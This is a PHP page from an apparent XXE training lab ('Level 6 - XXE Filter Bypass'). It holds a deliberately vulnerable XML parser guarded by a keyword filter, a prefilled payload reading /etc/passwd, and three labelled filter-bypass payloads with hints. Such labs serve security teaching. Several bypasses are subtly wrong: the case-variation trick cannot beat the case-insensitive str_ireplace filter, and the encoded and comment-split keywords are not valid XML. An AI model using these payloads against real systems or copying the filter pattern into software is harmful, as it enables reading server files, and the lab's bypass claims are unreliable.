<?php include '../includes/header.php'; ?>

        <div class="main-content">
            <h2>Level 6 - XXE Filter Bypass</h2>
            
            <div style="margin: 20px 0; padding: 15px; background: #e7f3ff; border-radius: 5px; border-left: 3px solid #007bff;">
                <h3>📖 Lab Description</h3>
                <p>
                    This lab implements basic input filtering to block XXE attacks, but it's still vulnerable. 
                    The server filters common XXE patterns like <code>DOCTYPE</code>, <code>ENTITY</code>, and 
                    <code>SYSTEM</code>, but these filters can be bypassed using encoding tricks.
                </p>
            </div>

            <div class="xml-form">
                <h3>XML Input:</h3>
                <form method="POST">
                    <textarea name="xml_input" placeholder="Enter XML here..."><?php 
                        echo htmlspecialchars('<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
    <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<data>
    <content>&xxe;</content>
</data>'); 
                    ?></textarea>
                    <br>
                    <button type="submit">Parse XML</button>
                </form>
            </div>

            <?php
            if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['xml_input'])) {
                $xml = $_POST['xml_input'];
                
                // Basic filtering - can be bypassed!
                $filteredXml = str_ireplace(['DOCTYPE', 'ENTITY', 'SYSTEM', 'PUBLIC'], '', $xml);
                
                // Still vulnerable to bypassed payloads
                $internalErrors = libxml_use_internal_errors(true);
                $result = simplexml_load_string($filteredXml);
                
                if ($result) {
                    echo '<div class="results">';
                    echo '<h3>✅ Parsing Results:</h3>';
                    echo '<pre>' . htmlspecialchars(print_r($result, true)) . '</pre>';
                    echo '</div>';
                } else {
                    echo '<div class="error">';
                    echo '<h3>❌ Parsing Error:</h3>';
                    $errors = libxml_get_errors();
                    foreach ($errors as $error) {
                        echo '<pre>' . htmlspecialchars($error->message) . '</pre>';
                    }
                    echo '</div>';
                }
                
                libxml_use_internal_errors($internalErrors);
            }
            ?>

            <div class="examples">
                <h3>💡 Bypass Payloads:</h3>
                
                <h4>Case Encoding Bypass:</h4>
                <pre><?php echo htmlspecialchars('<?xml version="1.0" encoding="UTF-8"?>
<!dOcTyPe data [
    <!eNtItY xxe SyStEm "file:///etc/passwd">
]>
<data>
    <content>&xxe;</content>
</data>'); ?></pre>
                
                <h4>Unicode Encoding Bypass:</h4>
                <pre><?php echo htmlspecialchars('<?xml version="1.0" encoding="UTF-8"?>
<!&#x44;&#x4F;&#x43;&#x54;&#x59;&#x50;&#x45; data [
    <!&#x45;&#x4E;&#x54;&#x49;&#x54;&#x59; xxe &#x53;&#x59;&#x53;&#x54;&#x45;&#x4D; "file:///etc/passwd">
]>
<data>
    <content>&xxe;</content>
</data>'); ?></pre>
                
                <h4>Comment Injection Bypass:</h4>
                <pre><?php echo htmlspecialchars('<?xml version="1.0" encoding="UTF-8"?>
<!D<!---->OCTYPE data [
    <!E<!---->NTITY xxe S<!---->YSTEM "file:///etc/passwd">
]>
<data>
    <content>&xxe;</content>
</data>'); ?></pre>
            </div>

            <div class="hints">
                <h3>💡 Hints:</h3>
                <ul>
                    <li>The filter looks for specific XXE keywords</li>
                    <li>Try using different case variations</li>
                    <li>Unicode encoding or character escaping might work</li>
                    <li>Try inserting comments within keywords</li>
                    <li>Experiment with different encoding formats</li>
                </ul>
            </div>
        </div>

<?php include '../includes/footer.php'; ?>
